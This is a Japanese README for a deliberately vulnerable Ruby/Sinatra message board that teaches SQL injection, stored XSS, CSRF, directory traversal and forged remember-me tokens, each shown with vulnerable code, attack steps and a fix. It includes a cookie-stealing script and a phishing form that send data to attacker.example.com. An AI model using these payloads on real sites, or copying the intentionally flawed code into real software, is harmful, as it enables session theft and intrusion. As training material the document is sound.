# 脆弱性学習用 掲示板アプリ

セキュリティの脆弱性を**手を動かして学ぶ**ための掲示板アプリケーション。
意図的に脆弱性を仕込んだコードに対して、実際に攻撃 → 理解 → 防御のサイクルで学習する。

> **警告**: このアプリは学習目的で意図的に脆弱性を含んでいます。本番環境やインターネットに公開された環境では絶対に使用しないでください。

## 技術スタック

- Ruby 3.3 + Sinatra（軽量Webフレームワーク）
- SQLite3（データベース）
- ERB（テンプレートエンジン）
- 外部サービス不要、ローカルで完結

## セットアップ

```bash
cd vulnerable-board

# 依存関係のインストール
bundle install

# データベースの初期化（テスト用ユーザー・投稿を作成）
ruby db/setup.rb

# サーバー起動
ruby app.rb
```

http://localhost:4567 にアクセス。

### テスト用アカウント

| ユーザー名 | パスワード |
|-----------|-----------|
| admin | password123 |
| alice | alice456 |

## 学習カリキュラム

各回ごとに「脆弱なコードで攻撃を体験 → なぜ成功するか理解 → 安全なコードに修正 → 再攻撃して防げることを確認」のサイクルで進める。

| 回 | 機能 | 脆弱性 | 攻撃例 | 状態 |
|----|------|--------|--------|------|
| 1 | ログイン | SQLインジェクション | `' OR 1=1 --` でログイン突破 | 実装済み |
| 2 | 投稿表示 | XSS | `<script>alert('XSS')</script>` を投稿 | 実装済み |
| 3 | 投稿削除 | CSRF | 罠サイトから他人の投稿を削除 | 実装済み |
| 4 | アイコンアップロード | ディレクトリトラバーサル | `../../etc/passwd` 的なファイル名 | 実装済み |
| 5 | Remember me | 認証の不備 | MD5(username) を計算してCookieを偽造 | 実装済み |

## 第1回: SQLインジェクション

### 脆弱な箇所

`app.rb` のログイン処理（`post '/login'`）で、ユーザー入力を直接SQL文に埋め込んでいる。

```ruby
# 脆弱なコード
query = "SELECT * FROM users WHERE username = '#{username}' AND password = '#{password}'"
```

### 攻撃してみる

1. http://localhost:4567/login にアクセス
2. ユーザー名に `' OR 1=1 --` と入力
3. パスワードは何でもOK
4. ログインボタンを押す → **admin としてログインできてしまう**

ターミナルに出力されるSQL文を確認すると、なぜ突破できたか分かる：

```sql
SELECT * FROM users WHERE username = '' OR 1=1 --' AND password = '...'
```

- `'` で文字列リテラルを閉じる
- `OR 1=1` で常に真の条件を追加
- `--` 以降がコメントになり、パスワード検証が無視される

### 防御方法

プレースホルダ（パラメータバインド）を使う：

```ruby
# 安全なコード
user = db.execute("SELECT * FROM users WHERE username = ? AND password = ?", [username, password]).first
```

ユーザー入力がSQL構文として解釈されなくなるため、インジェクションが成立しない。

## 第2回: XSS（クロスサイトスクリプティング）

### 脆弱な箇所

`views/posts.erb` の投稿表示で、ユーザー入力をエスケープせずにHTMLに出力している。

```erb
<%# 脆弱なコード — エスケープなしで出力 %>
<div class="post-body"><%= post['body'] %></div>
```

SinatraのERBでは `<%= ... %>` はHTMLエスケープを**行わない**。そのため、投稿に含まれる `<script>` タグなどがそのままブラウザで実行される。

> **注意**: Ruby on Railsでは `<%= ... %>` は自動エスケープされるが、素のERB（Sinatra）では自動エスケープされない。

### 攻撃してみる

1. http://localhost:4567/login にアクセスし、ログイン
2. 投稿欄に `<script>alert('XSS')</script>` と入力して投稿
3. **アラートが表示される** = XSS脆弱性が存在する

### 攻撃のバリエーション

**Cookie窃取（セッションハイジャック）:**

```html
<script>new Image().src='http://attacker.example.com/steal?cookie='+document.cookie;</script>
```

攻撃者のサーバーに被害者のセッションCookieが送信され、なりすましが可能になる。

**偽のログインフォーム表示（フィッシング）:**

```html
<div style="position:fixed;top:0;left:0;width:100%;height:100%;background:white;z-index:9999;">
  <h1>セッションが切れました。再ログインしてください。</h1>
  <form action="http://attacker.example.com/phish" method="post">
    <input name="username" placeholder="ユーザー名">
    <input name="password" type="password" placeholder="パスワード">
    <button type="submit">ログイン</button>
  </form>
</div>
```

### 仕組み（なぜ成功するか）

```
1. 攻撃者が <script>悪意のあるコード</script> を投稿
2. DBにそのまま保存される（エスケープなし）
3. 他のユーザーが投稿一覧ページを閲覧
4. サーバーが <%= post['body'] %> でHTMLに埋め込む（エスケープなし）
5. ブラウザが <script> タグを正規のスクリプトとして実行
   → Cookie漏洩、画面改ざん、リダイレクトなどが起きる
```

このタイプのXSSは**格納型XSS（Stored XSS）**と呼ばれる。DBに保存されたスクリプトが閲覧者全員に影響する、最も危険なXSSの一種。

### 防御方法

出力時にHTMLの特殊文字をエスケープする：

```erb
<%# 安全なコード — エスケープして出力 %>
<div class="post-body"><%= Rack::Utils.escape_html(post['body']) %></div>
```

エスケープにより、特殊文字が無害な文字列に変換される：

| 元の文字 | エスケープ後 |
|---------|------------|
| `<` | `&lt;` |
| `>` | `&gt;` |
| `"` | `&quot;` |
| `'` | `&#x27;` |
| `&` | `&amp;` |

`<script>` は `&lt;script&gt;` となり、ブラウザには「タグ」ではなく「文字列」として表示される。

## 第3回: CSRF（クロスサイトリクエストフォージェリ）

### 脆弱な箇所

`app.rb` の投稿削除処理（`post '/posts/:id/delete'`）にCSRFトークンの検証がない。また、`views/posts.erb` の削除フォームにCSRFトークンの hidden フィールドがない。

```ruby
# 脆弱なコード — CSRFトークンを検証していない
post '/posts/:id/delete' do
  redirect '/login' unless logged_in?
  db.execute("DELETE FROM posts WHERE id = ? AND user_id = ?", [params[:id], session[:user_id]])
  redirect '/posts'
end
```

```erb
<%# 脆弱なフォーム — CSRFトークンがない %>
<form action="/posts/<%= post['id'] %>/delete" method="post">
  <button type="submit">削除</button>
</form>
```

### 攻撃してみる

1. http://localhost:4567/login にアクセスし、ログイン
2. 投稿を1件作成する（投稿IDを確認 — 削除ボタンのフォームをブラウザの開発者ツールで確認）
3. **別タブ**で http://localhost:4567/csrf_trap.html を開く
4. 「賞品を受け取る」ボタンをクリック
5. **投稿が削除される** = CSRF脆弱性が存在する

> **補足**: `csrf_trap.html` の投稿IDはデフォルトで1になっている。対象の投稿IDに合わせて変更する。

### 仕組み（なぜ成功するか）

CSRF攻撃は「ブラウザがCookieを自動送信する」仕組みを悪用する。

```
■ 正規の操作（掲示板から削除）:
  ユーザー → 掲示板の削除ボタン → POST /posts/1/delete → サーバー
                                    + Cookie: session=abc123（自動付与）

■ CSRF攻撃（罠ページから削除）:
  ユーザー → 罠ページのボタン → POST /posts/1/delete → サーバー
                                 + Cookie: session=abc123（自動付与！）
  ※ サーバーにはどちらも全く同じリクエストに見える
```

ポイント:
- ブラウザは、送信先ドメイン（localhost:4567）のCookieをリクエストに**自動的に付与**する
- 罠ページからのリクエストでも、掲示板アプリのセッションCookieが送られる
- サーバー側にCSRFトークンのチェックがないため、「正規のフォーム」と「罠ページのフォーム」を**区別できない**

### 防御方法

CSRFトークン（推測不可能なランダム値）をフォームとセッションの両方に持たせ、リクエスト時に一致を検証する：

```ruby
# フォーム描画時にトークンを生成
helpers do
  def csrf_token
    session[:csrf_token] ||= SecureRandom.hex(32)
  end
end

# POSTリクエスト受信時にトークンを検証
post '/posts/:id/delete' do
  halt 403, 'CSRF token mismatch' unless params[:csrf_token] == session[:csrf_token]
  # ... 以下、削除処理
end
```

```erb
<%# 安全なフォーム — CSRFトークンをhiddenフィールドに追加 %>
<form action="/posts/<%= post['id'] %>/delete" method="post">
  <input type="hidden" name="csrf_token" value="<%= session[:csrf_token] %>">
  <button type="submit">削除</button>
</form>
```

罠サイトは被害者のセッションに保存されたトークンの値を知ることができないため、正しいトークンを含むリクエストを送ることができず、攻撃が失敗する。

## 第4回: ディレクトリトラバーサル

### 脆弱な箇所

`app.rb` のアイコンアップロード処理（`post '/profile/upload'`）で、アップロードされたファイルのファイル名を検証せずにそのままパスに使っている。

```ruby
# 脆弱なコード
filename = uploaded[:filename]              # ../../views/posts.erb が来てもそのまま使う
upload_dir = File.join(__dir__, 'public', 'uploads')
save_path = File.join(upload_dir, filename) # upload_dir 外のパスが生成される

File.write(save_path, uploaded[:tempfile].read)  # 任意ファイルを上書き
```

### 攻撃してみる

**攻撃用ERBファイルを作成する:**

```erb
<%# 攻撃者が用意した偽の posts.erb %>
<h1 style="color: red; text-align: center;">このサイトは改ざんされました</h1>
<p>ディレクトリトラバーサル攻撃により views/posts.erb が上書きされました。</p>
```

**ブラウザからアップロードする:**

1. http://localhost:4567/profile にアクセス
2. ファイル選択で `attack.erb` を選ぶ
3. テキストフィールドに `../../views/posts.erb` と入力
4. アップロードボタンを押す
5. http://localhost:4567/posts を開くと、投稿一覧テンプレートが改ざんされた画面が表示される

> **補足**: curl の `-F` オプションはセキュリティ上の理由でファイル名のパス成分を自動除去するため、ブラウザのフォームから攻撃する。テキストフィールドで別途ファイル名を受け取ることで Rack の sanitize も回避している。

**復元する:**

```bash
git checkout -- views/posts.erb
```

### 仕組み（なぜ成功するか）

```
upload_dir = /path/to/app/public/uploads/

ファイル名: ../../views/posts.erb

パス計算:
  public/uploads/ + ../../views/posts.erb
  = public/uploads/../../views/posts.erb
  = views/posts.erb        ← upload_dir 外に出る！

結果: /path/to/app/views/posts.erb が上書きされる
```

サーバーはアップロードされたファイルを `public/uploads/` に保存するつもりだったが、`../` によって親ディレクトリに遡り、`views/` ディレクトリのファイルを上書きしてしまう。

### 防御方法

```ruby
# 方法1: File.basename でパス成分を除去する
filename = File.basename(params[:file][:filename])
# ../../views/posts.erb → posts.erb（../ が除去される）

# 方法2: SecureRandom.hex でランダムなファイル名を生成する（推奨）
ext = File.extname(params[:file][:filename])
filename = SecureRandom.hex(16) + ext
# 攻撃者がファイル名を制御できなくなる

# 方法3: Pathname#cleanpath で保存先ディレクトリ外を拒否する
save_path = File.expand_path(filename, upload_dir)
halt 400, '不正なファイル名です' unless save_path.start_with?(upload_dir)
# upload_dir の外へのパスは 400 エラーで拒否する
```

## 第5回: 認証の不備（Remember meトークンの予測可能性）

### 脆弱な箇所

`app.rb` のログイン処理で、"ログイン状態を保存する" チェック時に `Digest::MD5.hexdigest(username)` をトークンとして生成している。

```ruby
# 脆弱なコード
token = Digest::MD5.hexdigest(username)
# MD5 は決定論的: 同じ入力 → 常に同じ出力
# "admin" → "21232f297a57a5a743894a0e4a801fc3" （いつでも同じ）
```

### 攻撃してみる

1. http://localhost:4567/login で **alice** としてログイン（「ログイン状態を保存する」をチェック）
2. ログアウトする
3. ターミナルで **admin** のトークンを計算:
   ```bash
   ruby -e "require 'digest'; puts Digest::MD5.hexdigest('admin')"
   # → 21232f297a57a5a743894a0e4a801fc3
   ```
4. ブラウザの開発者ツール（Console）でCookieを偽造:
   ```javascript
   document.cookie = "remember_token=21232f297a57a5a743894a0e4a801fc3; path=/"
   ```
5. http://localhost:4567/posts にアクセス → **パスワードなしで admin としてログインできてしまう**

### 仕組み（なぜ成功するか）

```
■ 前提: username は投稿一覧で誰でも見える

攻撃者が知っていること:
  - username = "admin"（投稿一覧から確認）
  - トークン生成アルゴリズム = MD5(username)（コードや挙動から推測）

攻撃者が計算できること:
  - Digest::MD5.hexdigest("admin") = "21232f297a57a5a743894a0e4a801fc3"

サーバーの動作:
  - Cookie の remember_token を受け取る
  - DBで一致するユーザーを検索 → admin が見つかる → ログイン成功
```

問題の本質: トークンが **決定論的**（ランダム性がない）なため、アルゴリズムと入力が分かれば誰でも同じ値を生成できる。

### 防御方法

暗号論的に安全な乱数を使い、入力値から推測不可能なトークンを生成する:

```ruby
# 安全なコード
token = SecureRandom.hex(32)
# → "a3f8c2e1..." のような毎回異なる256ビットのランダム値
# username を知っていても計算できない
```

| | 脆弱（MD5） | 安全（SecureRandom） |
|--|------------|---------------------|
| 入力 | username（公開情報） | なし（純粋な乱数） |
| 出力 | 常に同じ値 | 毎回異なる値 |
| 予測可能か | ✅ 可能 | ❌ 不可能 |

## ディレクトリ構成

```
vulnerable-board/
├── Gemfile              # 依存関係
├── app.rb               # メインアプリ（Sinatra）
├── views/
│   ├── layout.erb       # 共通レイアウト
│   ├── login.erb        # ログイン画面
│   ├── register.erb     # ユーザー登録画面
│   ├── posts.erb        # 投稿一覧（掲示板）
│   └── profile.erb      # プロフィール
├── public/
│   ├── csrf_trap.html   # CSRF攻撃の罠ページ（第3回で使用）
│   └── uploads/         # アップロード画像（第4回で使用）
└── db/
    ├── setup.rb         # DB初期化スクリプト
    └── board.db         # SQLiteデータベース
```
